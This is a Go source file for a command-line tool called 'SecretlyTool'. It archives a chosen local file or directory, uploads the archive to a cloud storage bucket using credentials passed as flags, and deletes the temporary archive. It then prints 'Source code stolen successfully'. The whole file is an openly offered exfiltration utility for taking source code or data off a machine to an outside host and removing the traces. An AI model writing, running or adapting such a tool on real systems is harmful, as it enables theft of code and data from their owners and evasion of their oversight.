package main

import (
	"SecretlyTool/pakg/pack"
	"SecretlyTool/pakg/upload"
	"flag"
	"fmt"
	"log"
	"os"
	"runtime"
	"strconv"
	"time"
)

var (
	AccessKeyId     = flag.String("k", "", "AccessKeyId")
	AccessKeySecret = flag.String("s", "", "AccessKeySecret")
	Endpoint        = flag.String("e", "", "Endpoint")
	file            = flag.String("f", "", "local file path")
	Bucket          = flag.String("b", "", "Bucket")
	h               = flag.Bool("h", false, "help")
)

func main() {
	sysType := runtime.GOOS
	var dst string
	path := strconv.FormatInt(time.Now().Unix(), 10)
	if sysType == "linux" {
		dst = "/tmp/" + path + ".tar.gz"
	}
	if sysType == "windows" {
		dst = os.Getenv("temp") + "\\" + path + ".tar.gz"
	}

	if pack.Pack(*file, dst) != nil {
		log.Printf("文件 %s 打包错误", *file)
		os.Exit(-1)
	}
	if upload.Upload(dst, *AccessKeyId, *AccessKeySecret, *Endpoint, *Bucket) != nil {
		log.Printf("文件上传出错，请检查参数是否正确", *file)
		os.Exit(-1)
	}
	if os.Remove(dst) != nil {
		log.Fatalf("删除备份文件 %s 出错，请到 tmp 目录下手动删除", dst)
	}
	log.Println("OK, Source code stolen successfully !!!")

}

func init() {
	Banner := " ____                              __    ___               ______              ___      \n/\\  _`\\                           /\\ \\__/\\_ \\             /\\__  _\\            /\\_ \\     \n\\ \\,\\L\\_\\     __    ___  _ __   __\\ \\ ,_\\//\\ \\   __  __   \\/_/\\ \\/   ___    __\\//\\ \\    \n \\/_\\__ \\   /'__`\\ /'___/\\`'__/'__`\\ \\ \\/ \\ \\ \\ /\\ \\/\\ \\     \\ \\ \\  / __`\\ / __`\\ \\ \\   \n   /\\ \\L\\ \\/\\  __//\\ \\__\\ \\ \\/\\  __/\\ \\ \\_ \\_\\ \\\\ \\ \\_\\ \\     \\ \\ \\/\\ \\L\\ /\\ \\L\\ \\_\\ \\_ \n   \\ `\\____\\ \\____\\ \\____\\ \\_\\ \\____\\\\ \\__\\/\\____\\/`____ \\     \\ \\_\\ \\____\\ \\____/\\____\\\n    \\/_____/\\/____/\\/____/\\/_/\\/____/ \\/__/\\/____/`/___/> \\     \\/_/\\/___/ \\/___/\\/____/\n                                                     /\\___/                             \n                                                     \\/__/      By @ 7TEN7               "
	flag.Parse()
	fmt.Println(Banner)
	if len(os.Args) <= 4 {
		fmt.Println("SecretlyTool version: SecretlyTool/0.0.1\nUsage: SecretlyTool [-k AccessKeyId] [-s AccessKeySecret] [-e Endpoint] [-b Bucket] [-f file]\n\nOptions:\n")
		flag.PrintDefaults()
		os.Exit(0)
	}
	if *h == true {
		fmt.Println("SecretlyTool version: SecretlyTool/0.0.1\nUsage: SecretlyTool [-k AccessKeyId] [-s AccessKeySecret] [-e Endpoint] [-b Bucket] [-f file]\n\nOptions:\n")
		flag.PrintDefaults()
		os.Exit(0)
	}
}
